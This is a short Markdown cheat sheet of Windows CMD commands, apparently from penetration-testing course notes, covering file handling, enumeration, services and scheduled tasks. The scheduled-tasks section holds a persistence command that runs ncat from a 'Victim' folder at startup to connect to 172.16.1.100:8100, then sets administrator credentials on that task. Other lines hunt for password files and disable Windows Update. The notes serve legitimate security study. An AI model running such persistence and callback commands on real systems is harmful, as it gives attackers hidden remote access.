# CMD commands

```powershell
# Command history
doskey /history

# File system
mkdir
md
rmdir
rd /S Git-Pulls
move example C:\Users\htb\Documents\example
xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E

# Files 
type
more secrets.txt
more /S secrets.txt
echo Check out this text > demo.txt
fsutil file createNew for-sure.txt 222
ren demo.txt superdemo.txt
find /i "see" < test.txt # find string in the file test.txt
ipconfig /all | find /i "IPV4"
copy secrets.txt C:\Users\student\Downloads\not-secrets.txt
move C:\Users\student\Desktop\bio.txt C:\Users\student\Downloads
del
erase

# General info
systeminfo
hostname
ver

# Network info
ipconfig
arp /a

# User info
whoami 
whoami /priv
whoami /groups

# System user info
net user
net group
net localgroup

# Resources info
net share
net view

# Searching files and dirs
where calc.exe
where /R C:\Users\student\ bio.txt # recursive
find "password" 'C:\Users\student\not-passwords.txt'
find /N /I /V "IP Address" example.txt # Flags in order - line number, not clause, ignore case
findstr

# Compare files
comp .\file-1.md .\file-2.md
comp .\file-1.md .\file-2.md /A # show lines
fc passwords.txt modded.txt /N

# Sort files
sort.exe .\file-1.md
sort.exe .\file-1.md /O .\sort-1.md # replace previous
sort.exe .\sort-1.md /unique

# Global variables
set # display all
set %SYSTEMROOT% # specific
echo %SYSTEMROOT%
set DCIP=172.16.5.2
setx DCIP 172.16.5.2 # persistent
setx DCIP "" # remove

# Services
sc query type= service # active
sc query windefend
sc stop Spooler
sc start Spooler
sc config wuauserv start= disabled # disable start
wmic service list brief

# Scheduled tasks
SCHTASKS /Query /V /FO list
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd". # add in credentials
schtasks /query /tn "My Secret Task" /V /fo list # check changes
schtasks /delete  /tn "My Secret Task" # delete task
```

